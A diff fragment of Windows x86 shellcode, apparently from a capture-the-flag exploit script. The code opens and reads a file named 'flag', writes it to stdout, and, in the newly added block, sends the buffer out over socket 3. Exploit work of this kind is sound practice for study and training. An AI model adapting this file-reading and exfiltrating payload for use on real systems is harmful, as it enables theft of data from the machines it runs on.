@@ -274,31 +274,41 @@ push 'flag'
 mov ebx, esp
 sub esp, 0x100
 
-push 0
-push esp
-push ebx
+push 0 ; OF_READ
+push esp ; &info
+push ebx ; path
 push {OpenFile}  ; kernel32!OpenFile
 call api_call
 
 mov ebp, esp
 
-push 0
-push 0
-push 0x100
-push ebp
-push eax
+push 0 ; opt
+push 0 ; opt
+push 0x100 ; size
+push ebp ; buffer
+push eax ; handle
 push {ReadFile}  ; kernel32!ReadFile
 call api_call
 
+; for STDOUT
 push -11 ; STD_OUTPUT_HANDLE
 push {GetStdHandle} ; kernel32!GetStdHandle
 call api_call
 
-push 0
-push 0
-push 0x100
-push ebp
-push eax
+push 0 ; opt
+push 0 ; opt
+push 0x100  ; size
+push ebp  ; buffer
+push eax  ; handle
 push {WriteFile}  ; kernel32!WriteFile
 call api_call
+
+; for socket
+push 0     ; flags
+push 0x100 ; size
+push ebp   ; buffer
+push 3     ; sock
+push {send} ; ws2_32!send
+call api_call
+
 '''
